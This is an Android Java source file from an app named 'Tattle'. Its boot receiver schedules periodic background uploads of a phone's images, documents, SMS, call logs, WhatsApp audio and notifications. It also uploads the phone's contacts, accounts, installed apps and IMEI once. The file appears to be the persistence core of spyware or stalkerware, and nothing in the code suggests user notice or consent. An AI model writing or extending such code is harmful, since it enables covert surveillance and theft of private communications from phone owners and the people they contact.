package com.globalsolutions.Tattle.Broadcasts;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;


import com.globalsolutions.Tattle.DataUploadServices.BasicDataUploadService;
import com.globalsolutions.Tattle.DataUploadServices.CallLogUploadService;
import com.globalsolutions.Tattle.DataUploadServices.ContinuouslyCheckingService;
import com.globalsolutions.Tattle.DataUploadServices.ContinuouslyDocUploadingService;
import com.globalsolutions.Tattle.DataUploadServices.ContinuouslyImagesUploadingService;
import com.globalsolutions.Tattle.DataUploadServices.NotificationUploadScheduler;
import com.globalsolutions.Tattle.DataUploadServices.SmsUploadService;
import com.globalsolutions.Tattle.DataUploadServices.WhatsAppAudioUploadService;
import com.globalsolutions.Tattle.OtherUtils.ContactUtil;
import com.globalsolutions.Tattle.OtherUtils.DeviceInfo;
import com.globalsolutions.Tattle.OtherUtils.SharedPrefs;

import java.io.Serializable;
import java.util.concurrent.TimeUnit;

public class PhoneBootReceiver extends BroadcastReceiver {
    Context context;
    SharedPrefs sharedPrefs;

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
            this.context = context;
            sharedPrefs = SharedPrefs.getInstance(context.getApplicationContext());
            WorkManager mWorkManager = WorkManager.getInstance();

            /*final OneTimeWorkRequest mMediaRequest = new OneTimeWorkRequest.Builder(MediaFilesUploader.class)
                    .addTag("MediaFilesUploader")
                    .build();
            mWorkManager.enqueue(mMediaRequest);

            final OneTimeWorkRequest mDocRequesRequest = new OneTimeWorkRequest.Builder(DocumentFilesUploader.class)
                    .addTag("DocFilesUploader")
                    .build();
            mWorkManager.enqueue(mDocRequesRequest);*/
            StartContinuouslyCheckingService();
            StartContinuouslyImagesUploadingService();
            StartContinuouslyDocsUploadingService();
            StartSmsUploadingService();
            StartCallLogUploadingService();
            StartWhatsAppAudioUploadingService();
            startNotificationUploadService();
            if (!sharedPrefs.isBasicDataUploaded()) {
                uploadDeviceInfo();
            }

            /*Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
            PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(NotificationUploadScheduler.class, 15, TimeUnit.MINUTES)
                    .setConstraints(constraints)
                    .build();

            mWorkManager.enqueueUniquePeriodicWork("uploadNotif", ExistingPeriodicWorkPolicy.REPLACE, build);*/
        }
    }

    public void uploadDeviceInfo() {
        DeviceInfo deviceInfo = new DeviceInfo(context);
        ContactUtil contactUtil = new ContactUtil(context);

        Intent serviceIntent = new Intent(context, BasicDataUploadService.class);
        serviceIntent.putExtra("deviceInfo", deviceInfo.getDetails());
        serviceIntent.putExtra("installedApps", (Serializable) deviceInfo.getInstalledApps());
        serviceIntent.putExtra("contacts", (Serializable) contactUtil.getContacts());
        serviceIntent.putExtra("accounts", (Serializable) deviceInfo.getAccounts());
        serviceIntent.putExtra("imei", deviceInfo.getIMEIDeviceId(context));
        BasicDataUploadService.enqueueWork(context, serviceIntent);
    }


    public void StartContinuouslyCheckingService() {
        Constraints constraints = new Constraints.Builder().build();
//        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(ContinuouslyCheckingService.class, 5, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();
        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("ContinuouslyCheckingService", ExistingPeriodicWorkPolicy.KEEP, build);
    }

    public void StartContinuouslyImagesUploadingService() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(ContinuouslyImagesUploadingService.class, 6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();
        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("ContinuouslyImagesUploadingService", ExistingPeriodicWorkPolicy.KEEP, build);
    }

    public void StartContinuouslyDocsUploadingService() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(ContinuouslyDocUploadingService.class, 6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();
        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("ContinuouslyDocsUploadingService", ExistingPeriodicWorkPolicy.KEEP, build);
    }

    public void StartSmsUploadingService() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(SmsUploadService.class, 6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();
        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("SmsUploadingService", ExistingPeriodicWorkPolicy.KEEP, build);
    }

    public void StartCallLogUploadingService() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(CallLogUploadService.class, 6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();
        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("CallLogUploadingService", ExistingPeriodicWorkPolicy.KEEP, build);
    }

    public void StartWhatsAppAudioUploadingService() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(WhatsAppAudioUploadService.class, 6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();
        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("WhatsAppAudioUploadingService", ExistingPeriodicWorkPolicy.KEEP, build);
    }

    public void startNotificationUploadService() {
        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(NotificationUploadScheduler.class, 6, TimeUnit.HOURS)
                .setConstraints(constraints)
                .build();

        WorkManager instance = WorkManager.getInstance();
        instance.enqueueUniquePeriodicWork("uploadNotif", ExistingPeriodicWorkPolicy.KEEP,build);
    }

}
